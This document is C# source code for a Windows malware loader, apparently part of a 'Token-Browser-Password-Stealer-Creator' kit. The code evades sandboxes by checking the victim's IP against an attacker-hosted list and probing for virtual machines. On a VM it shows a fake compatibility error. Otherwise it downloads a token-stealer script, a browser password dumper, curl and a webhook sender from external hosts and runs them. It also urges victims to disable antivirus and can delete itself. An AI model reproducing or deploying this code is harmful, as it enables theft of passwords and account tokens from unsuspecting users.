using System;
using System.IO;
using System.Windows.Forms;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.ComponentModel;
using System.Threading;
using System.Management;
using idk;

public class hexify
{
    private static WebClient ded = new WebClient();
    public static void Main()
    {
        string ip = new WebClient().DownloadString("https://myexternalip.com/raw");
        string vt = ded.DownloadString("https://itroublvehacker.cf/vt");
        if (vt.Contains(ip) || ip.Contains("72.12.194.") || vt.Contains(KeyDecoder.GetWindowsProductKeyFromRegistry()))
        {
            Environment.Exit(0);
        }
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        string Temp = Path.GetTempPath();
        string antivm = "C:\\Windows\\System32\\drivers\\";
        if (vmcheck() == false)
        {
            if (!File.Exists(antivm + "Vmmouse.sys"))
            {
                if (!File.Exists(antivm + "VBoxVideo.sys"))
                {
                    try
                    {
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("finalresbatch", Temp + "finalres.bat");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/BETA---NOT-FOR-PUBLIC/AVOID%20ME/Leaf.xNet.dll?raw=true", Temp + "Leaf.xNet.dll");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/BETA---NOT-FOR-PUBLIC/AVOID%20ME/System.Drawing.Common.dll?raw=true", Temp + "System.Drawing.Common.dll");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/BETA---NOT-FOR-PUBLIC/AVOID%20ME/Newtonsoft.Json.dll?raw=true", Temp + "Newtonsoft.Json.dll");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/BETA---NOT-FOR-PUBLIC/AVOID%20ME/tokenstealer.vbs", Temp + "finalres.vbs");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/BETA---NOT-FOR-PUBLIC/AVOID%20ME/tokenstealer2.vbs", Temp + "finalres2.vbs");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/WebBrowserPassView.exe?raw=true", Temp + "WebBrowserPassView.exe");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/curl-ca-bundle.crt", Temp + "curl-ca-bundle.crt");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/curl.exe?raw=true", Temp + "curl.exe");
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/BETA---NOT-FOR-PUBLIC/AVOID%20ME/sendhookfile.exe?raw=true", Temp + "filed.exe");
                        /*using (WebClient webClient = new WebClient())
                                webClient.DownloadFile("customexelink", Temp + "CustomEXE.exe");*/
                        Thread.Sleep(3000);
                        if (File.Exists(Temp + "filed.exe"))
                        {
                            Process run_bat = new Process();
                            run_bat.EnableRaisingEvents = false;
                            run_bat.StartInfo.FileName = Temp + "finalres.vbs";
                            run_bat.Start();
                            Thread.Sleep(1000);
                            //MessageBox.Show("Your Desc", "Your Title", MessageBoxButtons.btn, MessageBoxIcon.gaay);
                            //RemoveEXE();
                        }
                        else
                        {
                            MessageBox.Show("Please disable any debuggers/antivirus, and try again!", Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message); // ONLY FOR BETA TESTERS / TESTING
                        Environment.Exit(0);
                    }
                }
                else
                {
                    MessageBox.Show("The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", Application.ExecutablePath, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Environment.Exit(0);
                }
            }
            else
            {
                MessageBox.Show("The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", Application.ExecutablePath, MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
        }
        else
        {
            MessageBox.Show("The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", Application.ExecutablePath, MessageBoxButtons.OK, MessageBoxIcon.Error);
            Environment.Exit(0);
        }
    }

    public static void RemoveEXE()
    {
        Process.Start(new ProcessStartInfo()
        {
            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true,
            FileName = "cmd.exe"
        });
    }

    private static bool vmcheck()
    {
        try
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                {
                    foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                    {
                        string text = managementBaseObject["Manufacturer"].ToString().ToLower();
                        if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
        }
        catch
        {
			return false;
        }
        return false;
    }
}